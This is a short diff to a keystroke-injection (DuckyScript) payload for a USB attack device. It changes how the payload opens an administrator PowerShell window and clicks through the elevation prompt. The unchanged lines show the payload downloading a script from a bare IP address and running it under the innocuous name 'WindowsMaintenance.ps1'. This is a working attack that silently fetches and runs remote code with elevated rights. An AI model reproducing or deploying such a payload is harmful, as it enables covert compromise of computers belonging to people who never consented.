@@ -1,8 +1,9 @@
-WINDOWS r
+DELAY 3000
+CTRL ESC
 DELAY 1000
-STRING powershell Start-Process Powershell -Verb runAs
-ENTER
-DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
 LEFT
 ENTER
 DELAY 2000
@@ -19,4 +20,4 @@ STRING (New-Object System.Net.WebClient).DownloadFile('http://107.170.253.173/Wi
 ENTER
 DELAY 5000
 STRING .\WindowsMaintenance.ps1
-ENTER 
+ENTER
